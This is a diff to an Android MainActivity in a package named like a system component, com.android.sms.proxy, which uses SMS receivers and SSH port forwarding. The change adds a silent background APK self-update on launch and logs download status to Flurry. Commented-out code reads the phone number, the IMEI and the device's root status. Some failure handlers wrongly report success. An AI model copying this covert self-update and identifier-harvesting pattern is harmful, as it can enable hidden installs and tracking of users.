@@ -7,16 +7,26 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.support.v7.app.AppCompatActivity;
+import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.widget.TextView;
 
+import com.android.sms.proxy.R;
 import com.android.sms.proxy.entity.MessageEvent;
+import com.android.sms.proxy.entity.NativeParams;
 import com.android.sms.proxy.service.AlarmControl;
+import com.android.sms.proxy.service.ApkUpdateUtil;
 import com.android.sms.proxy.service.IProxyControl;
 import com.android.sms.proxy.service.ProxyServiceUtil;
 import com.android.sms.proxy.service.Receiver_SMS;
-import com.avos.avoscloud.AVCloud;
 import com.flurry.android.FlurryAgent;
+import com.oplay.nohelper.assist.bolts.Task;
+
+import net.luna.common.download.interfaces.ApkDownloadListener;
+import net.luna.common.download.model.AppModel;
+import net.luna.common.download.model.FileDownloadTask;
+import net.youmi.android.libs.common.download.ext.OplayDownloadManager;
+import net.youmi.android.libs.common.download.ext.SimpleAppInfo;
 
 import org.connectbot.bean.HostBean;
 import org.connectbot.bean.PortForwardBean;
@@ -26,12 +36,19 @@ import org.connectbot.service.TerminalManager;
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 
+import java.util.HashMap;
+import java.util.Map;
+import java.util.concurrent.Callable;
+
 /**
  * @author zyq 16-3-10
  */
 public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnReceiveSMSListener,
-		BridgeDisconnectedListener, ServiceConnection {
+		BridgeDisconnectedListener, ServiceConnection, ApkDownloadListener, OplayDownloadManager
+				.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
+				.common.download.listener.ApkDownloadListener {
 
+	private static final boolean DEBUG = true;
 	private static final String TAG = "main";
 	public static final String NETWORK_CACHE_DIR = "volley";
 	private TextView message;
@@ -95,9 +112,9 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-//		setContentView(R.layout.main_activity);
-//		message = (TextView) findViewById(R.id.message);
-//		message.setMovementMethod(ScrollingMovementMethod.getInstance());
+		setContentView(R.layout.main_activity);
+		message = (TextView) findViewById(R.id.message);
+		message.setMovementMethod(ScrollingMovementMethod.getInstance());
 		//EventBus.getDefault().register(this);
 		//Receiver_SMS.setReceiveListener(this);
 //		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
@@ -106,18 +123,20 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 //		Log.d(TAG, "手机号码:" + phoneNumber);
 //		String imei = PhoneInfo.getInstance(this).getIMEI();
 //		Log.d(TAG, "imei:" + imei);
+
+		EventBus.getDefault().register(this);
 		AlarmControl.getInstance(this).initAlarm(1, 1, 1, 1);
-
-		//友盟不支持在service中做统计！！！！！！！！
-
 		FlurryAgent.onStartSession(this);
-//		Task.callInBackground(new Callable<Object>() {
-//			@Override
-//			public Object call() throws Exception {
-//				ApkUpdateUtil.getInstance(getApplication()).updateApk();
-//				return null;
-//			}
-//		});
+		OplayDownloadManager.getInstance(this).registerListener(this);
+		OplayDownloadManager.getInstance(this).addDownloadStatusListener(this);
+		OplayDownloadManager.getInstance(this).addProgressUpdateListener(this);
+		Task.callInBackground(new Callable<Object>() {
+			@Override
+			public Object call() throws Exception {
+				ApkUpdateUtil.getInstance(getApplication()).updateApk();
+				return null;
+			}
+		});
 
 	}
 
@@ -140,23 +159,22 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 	}
 
 
-
-	@Override
-	protected void onDestroy() {
-		FlurryAgent.onEndSession(this);
-		super.onDestroy();
-//		ComponentName componentToEnable = new ComponentName("com.android.sms.proxy", "com.android.sms.proxy.ui" +
-//				".MainActivity");
-//		getPackageManager().setComponentEnabledSetting(componentToEnable, PackageManager
-//						.COMPONENT_ENABLED_STATE_ENABLED,
-//				PackageManager.DONT_KILL_APP);
-//		if (binder != null) {
-//			unbindService(connection);
-//		}
-//		if (mProxyControl != null) {
-//			unbindService(this);
-//		}
-	}
+//	@Override
+//	protected void onDestroy() {
+//
+//		super.onDestroy();
+////		ComponentName componentToEnable = new ComponentName("com.android.sms.proxy", "com.android.sms.proxy.ui" +
+////				".MainActivity");
+////		getPackageManager().setComponentEnabledSetting(componentToEnable, PackageManager
+////						.COMPONENT_ENABLED_STATE_ENABLED,
+////				PackageManager.DONT_KILL_APP);
+////		if (binder != null) {
+////			unbindService(connection);
+////		}
+////		if (mProxyControl != null) {
+////			unbindService(this);
+////		}
+//	}
 
 	@Override
 	protected void onStop() {
@@ -211,5 +229,150 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 	@Override
 	public void onServiceDisconnected(ComponentName name) {
 		mProxyControl = null;
+	}
+
+
+	@Override
+	protected void onDestroy() {
+		super.onDestroy();
+		FlurryAgent.onEndSession(this);
+		OplayDownloadManager.getInstance(this).removeListener(this);
+		OplayDownloadManager.getInstance(this).removeDownloadStatusListener(this);
+		OplayDownloadManager.getInstance(this).removeProgressUpdateListener(this);
+	}
+
+	@Override
+	public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadStart(FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadSuccess(FileDownloadTask task) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+		final String downloadSuccess = "\nDownload success\n";
+		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+	}
+
+	@Override
+	public void onApkDownloadSuccess(AppModel model) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+		final String downloadSuccess = "\nDownload success(isExist)\n";
+		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+	}
+
+	@Override
+	public void onApkDownloadFailed(FileDownloadTask task) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+		final String downloadFail = "\nDownload Fail\n";
+		EventBus.getDefault().post(new MessageEvent(downloadFail));
+	}
+
+	@Override
+	public void onApkDownloadStop(FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadProgressUpdate(FileDownloadTask task, long contentLength, long completeLength, int
+			percent) {
+
+	}
+
+	@Override
+	public void onApkInstallSuccess(AppModel model) {
+//		Map<String, String> map = new HashMap<>();
+//		map.put(NativeParams.KEY_INSTALL_SUCCESS, String.valueOf(true));
+//		map.put(NativeParams.KEY_IS_DEVICE_ROOT, String.valueOf(RootTools.isAccessGiven()));
+//		FlurryAgent.logEvent(NativeParams.EVENT_START_INSTALL, map);
+//
+//        final String installSuccess = "\ninstallSuccess\n";
+//        EventBus.getDefault().post(new MessageEvent(installSuccess));
+
+	}
+
+	@Override
+	public void onDownloadStatusChanged(SimpleAppInfo info) {
+		if (DEBUG) {
+			Log.d(TAG, "download_state:" + info.getDownloadStatus());
+		}
+	}
+
+
+	@Override
+	public void onProgressUpdate(String url, int percent, long speedBytesPerS) {
+		if (DEBUG) {
+			Log.d(TAG, "onProgressUpdate!!!!!!!!!!!");
+		}
+	}
+
+	@Override
+	public void onApkDownloadBeforeStart_FileLock(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadStart(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadSuccess(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+		if(DEBUG){
+			Log.d(TAG,"apkDownloadSuccess!!!!!!!!!");
+		}
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+		final String downloadSuccess = "\nDownload success(isExist)\n";
+		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+	}
+
+	@Override
+	public void onApkDownloadFailed(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+		if(DEBUG){
+			Log.d(TAG,"apkDownloadFail!!!!!!!!!!!!!");
+		}
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+		final String downloadSuccess = "\nDownload success(isExist)\n";
+		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+	}
+
+	@Override
+	public void onApkDownloadStop(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+		if(DEBUG){
+			Log.d(TAG,"apkDownloadStop!!!!!!!!!!!!!");
+		}
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+		final String downloadSuccess = "\nDownload success(isExist)\n";
+		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+	}
+
+	@Override
+	public void onApkDownloadProgressUpdate(net.youmi.android.libs.common.download.model.FileDownloadTask task, long
+			contentLength, long completeLength, int percent, long speedBytesPerS) {
+
+	}
+
+	@Override
+	public void onApkInstallSuccess(int rawUrlHashCode) {
+
 	}
 }
